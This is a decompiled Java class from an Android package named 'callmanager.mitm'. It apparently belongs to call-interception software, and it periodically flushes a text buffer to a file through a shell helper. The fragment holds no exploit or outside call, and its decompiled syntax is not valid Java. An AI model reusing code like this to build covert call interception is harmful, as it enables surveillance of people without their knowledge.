package com.vvt.callmanager.mitm;

import com.vvt.shell.j;
import java.util.TimerTask;

class b
  extends TimerTask
{
  b(a parama) {}
  
  public void run()
  {
    Object localObject1 = a.a(this.a);
    if (localObject1 != null)
    {
      localObject1 = a.a(this.a);
      int i = ((StringBuilder)localObject1).length();
      if (i > 0)
      {
        localObject1 = a.a(this.a).toString();
        Object localObject2 = a.b(this.a);
        boolean bool = true;
        j.a((String)localObject2, (String)localObject1, bool);
        localObject1 = this.a;
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        a.a((a)localObject1, (StringBuilder)localObject2);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/mitm/b.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */